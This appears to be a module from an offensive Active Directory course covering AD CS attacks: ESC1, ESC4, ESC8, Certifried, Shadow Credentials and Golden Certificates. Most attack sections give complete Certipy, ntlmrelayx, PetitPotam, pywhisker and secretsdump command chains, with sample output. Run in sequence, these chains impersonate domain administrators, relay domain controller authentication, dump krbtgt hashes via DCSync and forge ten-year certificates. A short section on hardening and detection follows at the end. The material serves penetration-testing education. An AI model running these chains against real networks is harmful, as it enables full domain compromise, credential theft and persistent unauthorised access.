# Module 07: Active Directory Certificate Services (AD CS) — ESC1 Through ESC13

> **Navigation**: [⬅️ Module 06: Delegation & RBCD](Module-06-Kerberos-Delegation-Mechanisms-and-RBCD.md) | [🏠 Master Index](../README.md) | [Module 08: ACL & ACE Abuse ➡️](Module-08-Active-Directory-Access-Control-and-ACL-Abuse.md)

---


## 1. AD CS PKI Architecture & The Certificate Authentication Mechanism

Active Directory Certificate Services (AD CS) is Microsoft’s integrated Public Key Infrastructure (PKI) implementation. It enables enterprise organizations to issue digital certificates for:
- User and Computer Authentication (Smart Card logon, PKINIT Kerberos authentication).
- Code Signing and Software Restriction Policies.
- Transport Layer Security (TLS/SSL) for web servers and domain controllers (LDAPS).
- Encrypting File System (EFS).

```
+-----------------------------------------------------------------------------------------+
| ACTIVE DIRECTORY PKINIT AUTHENTICATION FLOW (RFC 4556)                                  |
|                                                                                         |
|  CLIENT (Possessing Valid X.509 PFX Certificate)        DOMAIN CONTROLLER (KDC)         |
|  Identity: administrator@corp.local                     IP: 10.0.0.1                    |
|            |                                                   |                        |
|            | 1. AS-REQ with PA-PK-AS-REQ                       |                        |
|            |    * Client signs timestamp with private key      |                        |
|            |    * Sends public X.509 Certificate               |                        |
|            +-------------------------------------------------->|                        |
|                                                                |                        |
|                                                                | KDC verifies CA chain. |
|                                                                | Matches certificate to |
|                                                                | user via UPN or SID.   |
|                                                                | Builds TGT for Admin!  |
|                                                                |                        |
|            | 2. AS-REP with PA-PK-AS-REP                       |                        |
|            |    * Returns valid Domain Admin TGT!              |                        |
|            |    * Returns PAC_CREDENTIAL_INFO (REVEALS NT HASH)|                        |
|            |<--------------------------------------------------+                        |
|                                                                                         |
|  Attacker receives valid TGT + NT Hash! Full Domain Compromise via PKINIT!              |
+-----------------------------------------------------------------------------------------+
```

### Why AD CS is the #1 Domain Privilege Escalation Target:
1. **Implicit Trust**: Certificates issued by an Enterprise CA are automatically trusted by every domain controller and member workstation in the forest.
2. **PKINIT Credentials**: Authenticating with a valid certificate via PKINIT returns not only a Kerberos TGT, but also the **user's NT Hash** inside the `PAC_CREDENTIAL_INFO` buffer!
3. **Misconfiguration Density**: Most AD CS templates and Web Enrollment endpoints were deployed over a decade ago with vulnerable default configurations.

---

## 2. The Complete ESC (Certified Pre-Owned) Vulnerability Taxonomy

The security researchers Will Schroeder (@harmj0y) and Lee Christensen (@tifkin_) published the groundbreaking research *"Certified Pre-Owned"*, establishing the ESC taxonomy:

```
+---------------------------------------------------------------------------------------------------+
| TAXONOMY OF ACTIVE DIRECTORY CERTIFICATE SERVICES MISCONFIGURATIONS (ESC1 - ESC13)                |
+-------+---------------------------------------------+---------------------------------------------+
| ESC   | Vulnerability Classification                | Core Exploitation Primitives                |
+-------+---------------------------------------------+---------------------------------------------+
| ESC1  | Enrollee Supplies Subject (SAN Misconfig)   | Client Auth EKU + Enrollee Supplies SAN     |
| ESC2  | Any Purpose EKU or No EKU                   | Certificate can be used for ANY purpose     |
| ESC3  | Certificate Request Agent Misconfiguration  | Requests certificates on behalf of others   |
| ESC4  | Vulnerable Certificate Template Access Control| Overwriting template DACL to enable ESC1  |
| ESC5  | Vulnerable CA Server / Host Access Control  | Full compromise of PKI server / container   |
| ESC6  | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA        | CA enforces SAN specification globally      |
| ESC7  | Vulnerable CA Access Permissions            | ManageCA / ManageCertificates permissions   |
| ESC8  | NTLM Relay to AD CS HTTP Web Enrollment     | Relaying coerced DC NTLM auth to /certsrv   |
| ESC9  | Strong Certificate Binding Bypass (No SID)  | Certificate lacks extension szOID_NTDS_CA   |
| ESC10 | Weak Certificate Mapping via UPN / Hostname | Exploiting generic account mapping rules    |
| ESC11 | NTLM Relay to ICPR RPC Interface            | Relay over RPC without packet privacy       |
| ESC12 | Shell Access to CA Server / DPAPI Keys      | Exporting CA Private Key from disk/registry |
| ESC13 | Group-Linked Issuance Policy Restrictions   | Abusing OID-linked universal group access   |
+-------+---------------------------------------------+---------------------------------------------+
```

---

## 3. Deep-Dive Exploitation: ESC1, ESC4, and ESC8

### 1. ESC1: Subject Alternative Name (SAN) Impersonation
ESC1 occurs when a certificate template permits low-privileged users to request client authentication certificates while allowing the requester to specify an arbitrary **Subject Alternative Name (SAN)**.

#### Requirements for ESC1:
1. Enterprise CA grants enrollment rights to standard users (e.g., `Authenticated Users` or `Domain Users`).
2. Template contains Client Authentication Extended Key Usage (EKU) (e.g., `Client Authentication` OID `1.3.6.1.5.5.7.3.2` or `Smart Card Logon` OID `1.3.6.1.4.1.311.20.2.2`).
3. Flag **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x00000001`)** is set in the `msPKI-Certificate-Name-Flag` attribute.
4. Manager approval is **NOT** required.

#### Operational Execution with Certipy:
```bash
# 1. Enumerate all vulnerable certificate templates in the forest:
certipy find -vulnerable -stdout -u 'jdoe' -p 'Pass123!' -dc-ip 10.0.0.1

# 2. Request certificate specifying Administrator as the SAN:
certipy req -username 'jdoe' -password 'Pass123!' -ca 'corp-CA01-CA' \
  -target ca01.corp.local -template 'UserAuthentication' \
  -upn 'administrator@corp.local'

# (Certipy saves 'administrator.pfx' certificate bundle)

# 3. Authenticate via PKINIT to retrieve Administrator TGT and NT Hash:
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

```text
[*] Got TGT for 'administrator@corp.local'
[*] Saving credential cache to 'administrator.ccache'
[*] Dumping hashes for 'administrator@corp.local'
[*] administrator:500:aad3b435b51404eeaad3b435b51404ee:e5fc4f2b49d70367b54da724e1185ac4:::
```

---

### 2. ESC4: Vulnerable Template Access Control
ESC4 occurs when an attacker possesses write permissions (`GenericAll`, `GenericWrite`, or `WriteProperty`) over a certificate template Active Directory object in `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local`.

#### Operational Execution:
1. The attacker modifies the template configuration via LDAP to:
   - Set `msPKI-Certificate-Name-Flag` to `1` (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
   - Add the `Client Authentication` EKU.
   - Remove manager approval requirements.
2. The attacker requests an ESC1 certificate for `administrator@corp.local`.
3. The attacker restores the original template settings to avoid operational detection.

```bash
# Automate ESC4 template modification, exploitation, and cleanup with Certipy:
certipy template -username 'jdoe' -password 'Pass123!' -template 'CustomWebServer' \
  -save-old -dc-ip 10.0.0.1

# Request the Administrator certificate:
certipy req -username 'jdoe' -password 'Pass123!' -ca 'corp-CA01-CA' \
  -template 'CustomWebServer' -upn 'administrator@corp.local'

# Restore the original template configuration:
certipy template -username 'jdoe' -password 'Pass123!' -template 'CustomWebServer' \
  -configuration 'CustomWebServer.json' -dc-ip 10.0.0.1
```

---

### 3. ESC8: NTLM Relay to AD CS HTTP Web Enrollment
The AD CS Web Enrollment role allows users to request certificates via an HTTP web interface located at `http://<CA_SERVER>/certsrv/`. By default:
- Web Enrollment uses plain HTTP.
- Extended Protection for Authentication (EPA) is disabled.
- NTLM authentication is enabled.

When combined with an RPC coercion tool (e.g., PetitPotam), an attacker can coerce a Domain Controller machine account (`DC01$`) to authenticate to the attacker, relay that authentication to the Web Enrollment endpoint, obtain a Domain Controller certificate, and perform DCSync!

```bash
# Step 1: Launch ntlmrelayx targeting CA Web Enrollment
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Step 2: Trigger RPC coercion on DC01 using PetitPotam
python3 PetitPotam.py -u 'jdoe' -p 'Pass123!' -d 'corp.local' 10.0.0.150 10.0.0.1

# Step 3: Authenticate as DC01$ using the certificate returned by ntlmrelayx
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1

# Step 4: Execute DCSync using the dumped DC01$ NT hash
impacket-secretsdump -hashes :<DC01_NTHASH> 'corp.local/DC01$@10.0.0.1' -just-dc-user krbtgt
```

---

### 4. Certifried (CVE-2022-26923): Domain Controller DNS Hostname Spoofing

Discovered by Oliver Lyak, **Certifried (CVE-2022-26923)** is a severe privilege escalation vulnerability stemming from how Active Directory Certificate Services maps computer identities during certificate issuance.

```
+-----------------------------------------------------------------------------------------+
| CERTIFRIED (CVE-2022-26923) EXPLOITATION CHAIN                                          |
|                                                                                         |
|  1. CREATE COMPUTER ACCOUNT:                                                            |
|     Attacker uses standard domain account to create machine account: FAKECOMP$          |
|                                                                                         |
|  2. SPOOF DNS HOSTNAME:                                                                 |
|     Attacker updates dNSHostName attribute on FAKECOMP$ to match Domain Controller:     |
|     dNSHostName = dc01.corp.local (AD historically failed to enforce uniqueness!)       |
|                                                                                         |
|  3. REQUEST MACHINE CERTIFICATE:                                                        |
|     Attacker requests certificate from AD CS using standard "Machine" template.         |
|     AD CS constructs the Subject Alternative Name (SAN) from dNSHostName!               |
|     CA issues certificate valid for: dc01.corp.local!                                   |
|                                                                                         |
|  4. AUTHENTICATE AS DOMAIN CONTROLLER VIA PKINIT:                                       |
|     Attacker authenticates via PKINIT presenting the certificate.                       |
|     KDC matches SAN to real DC01$ computer account -> Issues DC01$ TGT & NT Hash!       |
|                                                                                         |
|  5. DCSYNC:                                                                             |
|     Attacker executes DCSync using DC01$ credentials -> Forest Compromised!             |
+-----------------------------------------------------------------------------------------+
```

#### Step-by-Step Execution with Certipy:
```bash
# 1. Create a controlled machine account:
certipy account create -u 'jdoe@corp.local' -p 'Pass123!' -account 'FAKECOMP$' -password 'CompPass123!' -dc-ip 10.0.0.1

# 2. Update dNSHostName to target Domain Controller FQDN:
certipy account update -u 'jdoe@corp.local' -p 'Pass123!' -account 'FAKECOMP$' -dns 'dc01.corp.local' -dc-ip 10.0.0.1

# 3. Request certificate using the Machine template:
certipy req -u 'FAKECOMP$@corp.local' -p 'CompPass123!' -ca 'corp-CA01-CA' -target ca01.corp.local -template 'Machine' -dc-ip 10.0.0.1

# 4. Authenticate as the Domain Controller via PKINIT:
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1

# 5. Execute DCSync using dumped DC01$ NT hash:
impacket-secretsdump -hashes :<DC01_NTHASH> 'corp.local/DC01$@10.0.0.1' -just-dc-user krbtgt
```

#### Defensive Remediation & KB5014754:
Microsoft addressed CVE-2022-26923 in KB5014754 by introducing **Strong Certificate Binding**:
* The CA now embeds a non-forgeable extension containing the account's immutable object SID (`szOID_NTDS_CA_SECURITY_EXT` / OID `1.3.6.1.4.1.311.25.2`).
* When authenticating via PKINIT, the KDC matches the certificate against the embedded SID rather than the `dNSHostName` or UPN attribute, completely neutralizing spoofing attempts.

---

## 5. Shadow Credentials (`msDS-KeyCredentialLink`)

Introduced with Windows Server 2016 for Windows Hello for Business (WHfB), the **Shadow Credentials** technique allows an attacker who has write permissions (`GenericAll`, `GenericWrite`, or `WriteProperty`) over a target computer or user object to take complete control without modifying the target's password.

```
+-----------------------------------------------------------------------------------+
| SHADOW CREDENTIALS ATTACK MECHANICS                                                |
|                                                                                   |
|  ATTACKER (Write access to SQL01$)                     DOMAIN CONTROLLER (DC)     |
|            |                                                   |                  |
|            | 1. Generate RSA Key Pair locally                  |                  |
|            | 2. Construct KeyCredential binary structure       |                  |
|            | 3. Write KeyCredential to target object attribute:|                  |
|            |    msDS-KeyCredentialLink                         |                  |
|            +-------------------------------------------------->|                  |
|                                                                |                  |
|  The DC now trusts the Attacker's RSA Public Key for SQL01$!                      |
|                                                                                   |
|            | 4. Authenticate via PKINIT using Private Key      |                  |
|            |    Requests TGT for SQL01$                        |                  |
|            +-------------------------------------------------->|                  |
|            | 5. DC verifies signature using KeyCredentialLink  |                  |
|            |    Returns TGT and reveals SQL01$ NT Hash!        |                  |
|            |<--------------------------------------------------+                  |
+-----------------------------------------------------------------------------------+
```

### Execution via `pywhisker`:
```bash
# 1. Inject shadow credential into target computer object:
python3 pywhisker.py -d "corp.local" -u "jdoe" -p "Pass123!" \
  --target "SQL01$" --action "add" --filename "sql01_cred"

# 2. Authenticate as SQL01$ using PKINIT:
python3 gettgtpkinit.py -cert-pfx sql01_cred.pfx -pfx-pass <PASSWORD> \
  "corp.local/SQL01$" sql01.ccache

# 3. Request NT hash:
python3 getnthash.py -key <AS_REP_KEY> "corp.local/SQL01$"
```

---

## 5. Golden Certificates (Forging Persistence Forever)

If an attacker achieves administrative compromise of the Certification Authority server, they can export the CA's master private key (`ca.key` / `ca.pfx`).

With the CA private key, the attacker can forge a valid client authentication certificate for **ANY user in the forest** (including Domain Admins or Enterprise Admins) with a validity lifetime of **10 to 50 years**. Because the certificate is mathematically valid and signed by the trusted CA, the attacker never needs to communicate with the CA server again!

```bash
# Export the CA certificate and private key using Certipy:
certipy ca -backup -username 'Administrator' -hashes :<NTHASH> -ca 'corp-CA01-CA' -target ca01.corp.local

# Forge a Golden Certificate for Domain Administrator valid for 10 years:
certipy forge -ca-pfx corp-CA01-CA.pfx -upn administrator@corp.local \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local' -out golden_admin.pfx

# Authenticate at any time via PKINIT:
certipy auth -pfx golden_admin.pfx -dc-ip 10.0.0.1
```

---

## 6. Enterprise Defensive Hardening & Detection Engineering

### 1. Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`:
Ensure no certificate template with client authentication allows the enrollee to specify the SAN:
```powershell
# Query templates allowing enrollee-supplied subject:
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  -Filter * -Properties msPKI-Certificate-Name-Flag | Where-Object { $_."msPKI-Certificate-Name-Flag" -band 1 }
```

### 2. Enforce Strong Certificate Binding (KB5014754):
Configure Domain Controllers to require strong SID mapping for certificate authentication:
* Registry Path: `HKLM\SYSTEM\CurrentControlSet\Services\Kdc`
* Value Name: `StrongCertificateBindingEnforcement`
* Set Value to: `2` (Full Enforcement Mode). Certificates without a strong security identifier extension (`szOID_NTDS_CA_SECURITY_EXT`) are rejected.

### 3. SIEM Detection Query (Event ID 4886 / 4887):
Monitor CA logs for certificate requests specifying administrative SANs from unprivileged users:
```sql
index=windows EventCode=4887 Template="*User*" Attributes="*SAN*administrator*"
| stats count by Requester, Attributes, CommonName
```


---

> **Navigation**: [⬅️ Module 06: Delegation & RBCD](Module-06-Kerberos-Delegation-Mechanisms-and-RBCD.md) | [🏠 Master Index](../README.md) | [Module 08: ACL & ACE Abuse ➡️](Module-08-Active-Directory-Access-Control-and-ACL-Abuse.md)
